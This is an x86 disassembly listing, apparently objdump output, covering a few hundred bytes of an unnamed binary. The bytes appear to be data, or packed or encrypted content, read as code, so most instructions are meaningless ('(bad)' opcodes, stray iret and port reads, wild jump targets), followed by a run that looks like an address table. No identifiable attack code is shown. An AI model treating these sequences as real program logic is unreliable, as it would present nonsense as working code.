  42c610:	mov    ebp,eax
  42c612:	call   0xd041d00f
  42c617:	inc    ebp
  42c618:	mov    WORD PTR [ebx+0x4532184a],es
  42c61e:	or     bh,bh
  42c620:	mov    ebp,DWORD PTR [eax-0x74f68a1c]
  42c626:	iret   
  42c627:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42c628:	mov    WORD PTR [ebp+0x4e],es
  42c62b:	push   eax
  42c62c:	xor    bl,dh
  42c62e:	cmp    bh,bh
  42c630:	jne    0x42c5bd
  42c632:	lea    ecx,[eax]
  42c634:	lods   al,BYTE PTR ds:[esi]
  42c635:	dec    ebp
  42c636:	call   0xff46c06e
  42c63b:	cmp    ecx,DWORD PTR [ebp+0x74]
  42c63e:	cmp    ebp,DWORD PTR [edx+0x74]
  42c641:	dec    DWORD PTR [ebx-0x38baf758]
  42c647:	add    eax,ebx
  42c649:	fadd   DWORD PTR [ebp-0x18]
  42c64c:	mov    edi,eax
  42c64e:	lock inc edi
  42c651:	inc    ebp
  42c652:	test   BYTE PTR [ebx+0x832a89e],cl
  42c658:	xor    eax,DWORD PTR [ebp-0x75]
  42c65b:	add    ecx,DWORD PTR [eax]
  42c65d:	sbb    BYTE PTR [ebp+0x45],dl
  42c660:	xor    ecx,DWORD PTR [ebx+0x4d3bf003]
  42c666:	rdpmc  
  42c668:	test   DWORD PTR [ebx],0xc18b0fff
  42c66e:	or     BYTE PTR [ebp+0x4d],cl
  42c671:	mov    esi,DWORD PTR [ebx]
  42c673:	rol    BYTE PTR [ebx],1
  42c675:	iret   
  42c676:	cmp    ecx,DWORD PTR [ebp+esi*2-0xfcd7462]
  42c67d:	cmp    ecx,DWORD PTR [ebp+0xf]
  42c680:	xor    edx,DWORD PTR [edi-0x73]
  42c683:	dec    DWORD PTR [eax]
  42c685:	mov    esi,DWORD PTR [edx+0x10]
  42c688:	add    BYTE PTR [ebp+0x77],al
  42c68b:	mov    DWORD PTR [eax],ebx
  42c68d:	jmp    0x42c704
  42c68f:	or     DWORD PTR [ebp-0x179b6b62],0xff65f3bf
  42c699:	pop    edi
  42c69a:	inc    ebp
  42c69b:	pop    ebx
  42c69c:	mov    eax,edx
  42c69e:	loopne 0x42c6a0
  42c6a0:	(bad)  
  42c6a1:	mov    eax,ebx
  42c6a3:	push   ecx
  42c6a4:	ror    DWORD PTR [ebx+0x4d450813],0x33
  42c6ab:	push   esi
  42c6ac:	add    edi,DWORD PTR [edi+0x7180850]
  42c6b2:	inc    ebp
  42c6b3:	(bad)  
  42c6b4:	push   eax
  42c6b5:	sahf   
  42c6b6:	dec    edi
  42c6b7:	xor    bh,bh
  42c6b9:	add    ecx,DWORD PTR [ebx-0x3f740b77]
  42c6bf:	adc    al,0x89
  42c6c1:	adc    BYTE PTR [ecx+eax*1],0x75
  42c6c5:	add    bh,bh
  42c6c7:	or     BYTE PTR [eax*2-0x6bfc74bb],dl
  42c6ce:	fadd   DWORD PTR [eax]
  42c6d0:	call   0xff46b960
  42c6d5:	cmp    al,0x45
  42c6d7:	dec    ebp
  42c6d8:	mov    ecx,DWORD PTR [ebx+0xc7d8e0]
  42c6de:	ret    
  42c6df:	mov    eax,ecx
  42c6e1:	adc    al,0x11
  42c6e3:	add    al,0x0
  42c6e5:	add    BYTE PTR [ebp+0x0],dh
  42c6e8:	mov    edi,edi
  42c6ea:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42c6eb:	push   eax
  42c6ec:	inc    ebp
  42c6ed:	add    BYTE PTR [eax-0x2f],dl
  42c6f0:	adc    eax,0x8b45ff03
  42c6f5:	xor    edx,esp
  42c6f7:	add    ecx,DWORD PTR [ebp-0x77]
  42c6fa:	add    esp,edi
  42c6fc:	mov    eax,DWORD PTR [ebp-0x58]
  42c6ff:	inc    DWORD PTR [ebp+0x14]
  42c702:	mov    DWORD PTR [ebp+0x18],eax
  42c705:	push   eax
  42c706:	inc    ebp
  42c707:	dec    DWORD PTR [ebx-0x388ae7f4]
  42c70d:	call   0xfff2c1d5
  42c712:	mov    eax,DWORD PTR [ebp+0x8]
  42c715:	mov    edx,DWORD PTR [ebp+0x33]
  42c718:	xor    eax,DWORD PTR [ebx]
  42c71a:	lea    edi,[ebx]
  42c71c:	adc    DWORD PTR [edx+esi*2-0x75],esi
  42c720:	add    BYTE PTR [ecx+eax*8],cl
  42c723:	dec    ebp
  42c724:	xor    BYTE PTR [ebx],0xfc
  42c727:	add    edi,edi
  42c729:	pcmpeqw mm0,QWORD PTR [ebp-0x75]
  42c72d:	mov    eax,ebx
  42c72f:	pop    edi
  42c730:	push   es
  42c731:	leave  
  42c732:	or     dl,BYTE PTR [eax]
  42c734:	xor    eax,0x7fec2d55
  42c739:	in     al,0xec
  42c73b:	adc    DWORD PTR [edx+0x14],0x5e
  42c73f:	xor    eax,0x53149cc9
  42c744:	push   ebp
  42c745:	dec    esp
  42c746:	in     al,dx
  42c747:	or     BYTE PTR [ecx+0x57],dl
  42c74a:	inc    ebp
  42c74b:	inc    ecx
  42c74c:	mov    ecx,DWORD PTR [ecx-0x74a8dbf0]
  42c752:	push   edi
  42c753:	and    al,0x51
  42c755:	mov    edx,0x7be0833
  42c75a:	jb     0x42c756
  42c75c:	add    BYTE PTR [esi+0x30132c6],bl
  42c762:	inc    ebp
  42c763:	mov    DWORD PTR [ebx+0x8b9424],ecx
  42c769:	or     al,0x8b
  42c76b:	jl     0x42c6f8
  42c76d:	sbb    al,0x14
  42c76f:	dec    ebp
  42c770:	xor    BYTE PTR [ebp+0x1],0x8b
  42c774:	add    BYTE PTR [eax+eax*1],ah
  42c777:	xor    eax,DWORD PTR [ecx-0x75]
  42c77a:	mov    esp,DWORD PTR [esp+edx*1]
  42c77d:	add    ecx,DWORD PTR [ecx+0xca010f]
  42c783:	dec    esp
  42c784:	dec    ecx
  42c785:	adc    BYTE PTR [edx-0x15],ch
  42c788:	push   0x103039
  42c78d:	sbb    al,0x70
  42c78f:	inc    esp
  42c790:	push   0x10
  42c792:	dec    DWORD PTR [ecx+ecx*4+0x18]
  42c796:	mov    eax,edx
  42c798:	or     BYTE PTR [edi+eax*8+0x4532c69e],al
  42c79f:	mov    DWORD PTR [ebx+0x75681024],ecx
  42c7a5:	test   DWORD PTR [ebp+0x530efcf8],ecx
  42c7ab:	jge    0x42c822
  42c7ad:	xor    edi,edi
  42c7af:	pushf  
  42c7b0:	or     BYTE PTR [ebp+0x6c],dh
  42c7b3:	push   0xf88b85ff
  42c7b8:	or     BYTE PTR [ebp+0xb],dh
  42c7bb:	inc    edi
  42c7bd:	or     dh,al
  42c7bf:	jb     0x42c789
  42c7c1:	call   DWORD PTR [eax]
  42c7c3:	mov    DWORD PTR [ebp+0x24],eax
  42c7c6:	mov    ebp,ebx
  42c7c8:	adc    bh,bh
  42c7ca:	(bad)  
  42c7cb:	and    al,0xc6
  42c7cd:	lea    ebp,[edi+0x1fffc24]
  42c7d3:	or     BYTE PTR [esi+0x74],bl
  42c7d6:	ret    0x20
  42c7d9:	je     0x42c766
  42c7db:	sbb    al,0x83
  42c7dd:	mov    edi,0xe8ecfff8
  42c7e2:	mov    ecx,0xf81485ff
  42c7e7:	je     0x42c772
  42c7e9:	pop    esp
  42c7ea:	and    al,0x75
  42c7ec:	push   esi
  42c7ed:	and    al,0x8d
  42c7ef:	and    al,0xff
  42c7f1:	inc    BYTE PTR [ebx+ecx*4+0x18]
  42c7f5:	and    al,0x7c
  42c7f7:	pop    edi
  42c7f8:	adc    BYTE PTR [ebx+0x57],bl
  42c7fb:	in     eax,0x51
  42c7fd:	ret    0x33
  42c800:	mov    esi,0x187200
  42c805:	pushf  
  42c806:	inc    BYTE PTR [ecx+0x1614857c]
  42c80c:	jge    0x42c7aa
  42c80e:	mov    DWORD PTR [esp],ecx
  42c811:	(bad)  
  42c812:	cmp    DWORD PTR [eax],ebx
  42c814:	adc    BYTE PTR [eax],bl
  42c816:	push   ss
  42c817:	dec    DWORD PTR [edi+edi*8+0x18]
  42c81b:	adc    al,0xca
  42c81d:	mov    edx,DWORD PTR [esp+ecx*1+0x10]
  42c821:	into   
  42c822:	scas   eax,DWORD PTR es:[edi]
  42c823:	mov    DWORD PTR [eax+edx*2],esp
  42c826:	das    
  42c827:	inc    ebp
  42c828:	jne    0x42c7b5
  42c82a:	and    al,0x8b
  42c82c:	and    al,0x33
  42c82e:	lea    ecx,[eax]
  42c830:	jb     0x42c876
  42c832:	xor    ebp,ebx
  42c834:	adc    al,bh
  42c836:	xor    bh,bh
  42c838:	jne    0x42c87e
  42c83a:	sbb    al,0xff
  42c83c:	call   0x52a02685
  42c841:	push   ebx
  42c842:	inc    esp
  42c843:	push   ebx
  42c844:	mov    eax,ds:0x3c6802ed
  42c849:	retf   
  42c84a:	icebp  
  42c84b:	inc    edi
  42c84c:	test   eax,0xbd36be28
  42c851:	mov    ebx,0x49526
  42c856:	add    BYTE PTR [eax],al
  42c858:	push   esp
  42c859:	cmp    bl,BYTE PTR [esi+esi*2+0x6c]
  42c85d:	popa   
  42c85e:	inc    ebp
  42c85f:	jns    0x42c8d1
  42c861:	addr16 ja 0x42c8da
  42c864:	pop    esp
  42c865:	ja     0x42c8b8
  42c867:	arpl   WORD PTR [ebx+0x49],bp
  42c86a:	jne    0x42c8dc
  42c86c:	dec    ebx
  42c86d:	dec    ecx
  42c86e:	ins    DWORD PTR es:[edi],dx
  42c86f:	addr16 dec ebp
  42c871:	pop    esp
  42c872:	push   0x6a
  42c874:	jne    0x42c8e2
  42c876:	push   0x49
  42c878:	imul   ebp,DWORD PTR [ebx+0x63],0x7a
  42c87c:	ins    BYTE PTR es:[edi],dx
  42c87d:	cs jo  0x42c8e4
  42c880:	bound  eax,QWORD PTR [eax]
  42c882:	cmp    BYTE PTR [edx+0x10],0x0
  42c886:	ins    DWORD PTR es:[edi],dx
  42c887:	das    
  42c888:	adc    BYTE PTR [eax],al
  42c88a:	jmp    0x42c8d5
  42c88c:	adc    BYTE PTR [eax],al
  42c88e:	jecxz  0x42c8f0
  42c890:	adc    BYTE PTR [eax],al
  42c892:	adc    BYTE PTR [edx+0x10],dh
  42c895:	add    bl,bh
  42c897:	pop    edi
  42c898:	adc    BYTE PTR [eax],al
  42c89a:	xlat   BYTE PTR ds:[ebx]
  42c89b:	push   es
  42c89c:	adc    BYTE PTR [eax],al
  42c89e:	cwde   
  42c89f:	add    DWORD PTR [eax],edx
  42c8a1:	add    cl,al
  42c8a3:	xchg   edx,eax
  42c8a4:	inc    edx
  42c8a5:	add    ch,al
  42c8a7:	xchg   edx,eax
  42c8a8:	inc    edx
  42c8a9:	add    cl,cl
  42c8ab:	xchg   edx,eax
  42c8ac:	inc    edx
  42c8ad:	add    ch,cl
  42c8af:	xchg   edx,eax
  42c8b0:	inc    edx
  42c8b1:	add    cl,dl
  42c8b3:	xchg   edx,eax
  42c8b4:	inc    edx
  42c8b5:	add    ch,dl
  42c8b7:	xchg   edx,eax
  42c8b8:	inc    edx
  42c8b9:	add    cl,bl
  42c8bb:	xchg   edx,eax
  42c8bc:	inc    edx
  42c8bd:	add    ch,bl
  42c8bf:	xchg   edx,eax
  42c8c0:	inc    edx
  42c8c1:	add    BYTE PTR [edx-0x79ffbd38],al
  42c8c7:	enter  0x42,0x8a
  42c8cb:	enter  0x42,0x8e
  42c8cf:	enter  0x42,0x92
  42c8d3:	enter  0x42,0x96
  42c8d7:	enter  0x42,0x9a
  42c8db:	enter  0x42,0x9e
  42c8df:	enter  0x42,0x0
  42c8e3:	add    BYTE PTR [eax],al
  42c8e5:	add    BYTE PTR [eax],al
  42c8e7:	add    BYTE PTR [eax],al
  42c8e9:	add    BYTE PTR [eax+eax*1],al
	...
